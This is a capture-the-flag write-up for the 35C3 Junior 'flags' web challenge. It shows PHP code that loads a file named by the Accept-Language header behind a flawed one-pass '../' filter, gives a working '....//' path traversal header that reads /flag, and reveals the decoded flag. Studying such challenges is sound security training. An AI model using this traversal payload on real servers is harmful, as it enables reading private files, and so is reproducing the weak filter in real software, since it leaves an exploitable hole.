# 35C3 Junior CTF – flags

* **Category:** Web
* **Points:** 37 (variable)

## Challenge

> Fun with flags: http://35.207.169.47
>
> Flag is at /flag
>
> Difficulty estimate: Easy

## Solution

The page shows the PHP snippet of which is composed and an image.

The PHP code is the following.

```PHP
<?php
  highlight_file(__FILE__);
  $lang = $_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? 'ot';
  $lang = explode(',', $lang)[0];
  $lang = str_replace('../', '', $lang);
  $c = file_get_contents("flags/$lang");
  if (!$c) $c = file_get_contents("flags/ot");
  echo '<img src="data:image/jpeg;base64,' . base64_encode($c) . '">';
```

The web site extracts the language passed via HTTP header, considers the first language and tries to load a picture from the `flags` folder; that picture will be displayed.

Even if the `str_replace('../', '', $lang)` instruction is used, the path traversal vulnerability is still present and can be abused using `....//` instead of `../`.

After some attempts, you will discover the correct HTTP header to use.

```
Accept-Language: ....//....//....//....//flag
```

The returned "image" will be the following.

```HTML
<img src="data:image/jpeg;base64,MzVjM190aGlzX2ZsYWdfaXNfdGhlX2JlNXRfZmw0Zwo=">
```

Decoding the Base64 will give you the flag.

```
35c3_this_flag_is_the_be5t_fl4g
```